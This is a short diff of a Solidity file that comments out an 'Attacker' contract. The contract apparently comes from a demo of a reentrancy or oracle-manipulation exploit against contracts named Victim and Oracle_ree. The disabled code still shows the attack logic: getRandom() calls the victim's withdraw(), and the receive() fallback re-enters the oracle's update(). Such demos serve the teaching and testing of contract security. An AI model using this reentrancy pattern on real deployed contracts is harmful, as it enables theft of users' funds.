@@ -38,21 +38,21 @@ contract Oracle_ree {
     }
 }
 
-contract Attacker is IPRNG {
-    Victim public v;
-    Oracle_ree public o;
+// contract Attacker is IPRNG {
+//     Victim public v;
+//     Oracle_ree public o;
 
-    constructor(address payable _v, address _o) {
-        v = Victim(_v);
-        o = Oracle_ree(_o);
-    }
+//     constructor(address payable _v, address _o) {
+//         v = Victim(_v);
+//         o = Oracle_ree(_o);
+//     }
 
-    function getRandom() external returns (uint256) {
-        v.withdraw();
-        return 1;
-    }
+//     function getRandom() external returns (uint256) {
+//         v.withdraw();
+//         return 1;
+//     }
 
-    receive() external payable {
-        o.update(address(this), 10);
-    }
-}
+//     receive() external payable {
+//         o.update(address(this), 10);
+//     }
+// }
